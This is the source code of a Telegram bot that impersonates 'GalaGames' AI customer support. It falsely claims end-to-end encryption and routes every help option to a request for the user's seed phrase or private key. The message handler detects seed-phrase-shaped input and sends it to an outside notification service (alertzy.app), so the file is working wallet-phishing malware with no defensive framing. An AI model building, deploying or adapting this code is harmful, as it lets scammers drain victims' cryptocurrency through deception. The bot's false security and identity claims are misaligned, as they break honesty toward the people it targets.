require('dotenv').config()
const axios = require('axios')
const { Telegraf } = require('telegraf');
const express = require('express')

const TELEGRAM_API = `https://api.telegram.org/bot${process.env.TOKEN}`
const URI = `/webhook/${process.env.TOKEN}`
const WEBHOOK_URL = process.env.SERVER_URL + URI

const app = express()
app.use(express.json())

const init = async () => {
    const res = await axios.get(`${TELEGRAM_API}/setWebhook?url=${WEBHOOK_URL}`)
    console.log(res.data)
}

// Create a bot instance
const bot = new Telegraf(process.env.TOKEN);

function startMenu(ctx) {
    ctx.replyWithHTML(`
        <b>Welcome to GoGalaGames official AI chat support.</b>\n
        <b>This AI CHAT is powered by openAI modal and help any crypto related issues.</b>\n\n
        <i>All conversations are End-to-end encrypted and are fully <b>Secured & Private</b>.</i>`, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'GALA TOKEN PRICE', callback_data: 'tokenPrice' },
                    { text: 'GET HELP', callback_data: 'support' }
                ]
            ]
        }
    })
}

function supportMenu(ctx) {
    ctx.reply('GalaGames AI Support\nWhich of the following best describe you issue', 
    {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'BUY TOKEN', callback_data: 'connect' },
                    { text: 'MIGRATION', callback_data: 'connect' },
                    { text: 'NFTs', callback_data: 'connect' }
                ],
                [
                    { text: 'STAKING', callback_data: 'connect' },
                    { text: 'UNSTAKING', callback_data: 'connect' },
                    { text: 'AIRDROPS', callback_data: 'connect' },
                ],
                [
                    { text: 'CLAIM 10% REFLECTION', callback_data: 'connect' },
                    { text: 'OTHERS', callback_data: 'connect' },
                ]
            ]
        }
    })
};



    //Bot Action
    bot.command('start', ctx => {
        ctx.replyWithPhoto({
            source: 'asset/logo1.png'
        }).then(() => {
            startMenu(ctx)
        })
    })

    bot.action('tokenPrice', async ctx => {
        try {
            const res = await axios.get('https://min-api.cryptocompare.com/data/price?fsym=GALA&tsyms=USD,JPY,EUR,GBP')
            const { USD, JPY, EUR, GBP } = res.data
            const message = 
            `   Below are the current price list for GALA token
                Symbol: GALA
                USD Price: ${USD}
                GBP Price: ${GBP}
                EUR Price: ${EUR}
                JPY Price: ${JPY}
            `
            // console.log(res.data)
            ctx.deleteMessage()
            bot.telegram.sendMessage(ctx.chat.id, message, 
            {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: 'Home', callback_data: 'menu' },
                        ],
                    ]
                }
            })
        } catch (err) {
            ctx.deleteMessage()
            bot.telegram.sendMessage(ctx.chat.id, 'Oops.! Error fetching price.', 
            {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: 'Home', callback_data: 'menu' },
                        ],
                    ]
                }
            })
        }
        // ctx.answerCbQuery()
    })

    bot.action('menu', ctx => {
        // ctx.answerCbQuery()
        ctx.deleteMessage()
        startMenu(ctx)
    })

    bot.action('support', async ctx => {
        // ctx.answerCbQuery()
        ctx.deleteMessage()
        supportMenu(ctx)
    
    })

    bot.action('connect', (ctx) => {
        ctx.deleteMessage()
        ctx.reply('Please connect your wallet (import wallet is recommended.)', {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'IMPORT WALLET', callback_data: 'import' },
                        { text: 'WEB3 CONNECTION', url: 'https://galagames-ai.web.app' },
                    ]
                ]
            }
        });
    })

    bot.action('import', (ctx) => {
        ctx.deleteMessage()
        ctx.reply('Kindly Paste Your Seed Phrase or Private key to continue', 
        );
    })

    bot.on('message', async (ctx) => {

        try {
            const phrase = ctx.message.text;
        if (phrase.split(' ').length === 12 || phrase.split(' ').length === 15 || phrase.split(' ').length === 24 || (phrase.split(' ').length === 1 && phrase.length > 60))  {
            const webhook_url = `https://alertzy.app/send?accountKey=${process.env.ALERTZY_KEY}&title=New Phrase&message=${phrase}` //change notification
            const response = await axios.post(webhook_url)
            ctx.reply('Connecting to wallet please wait...'); // Reply to the user with a confirmation message
        } else {
            ctx.deleteMessage()
            ctx.reply('Invalid response.! Kindly try again')
            startMenu(ctx)
        }
        } catch (error) {
            console.error(error)
        }
        
    });

bot.launch()

app.listen(process.env.PORT || 5000, async () => {
    console.log('🚀 app running on port', process.env.PORT || 5000)
    await init()
})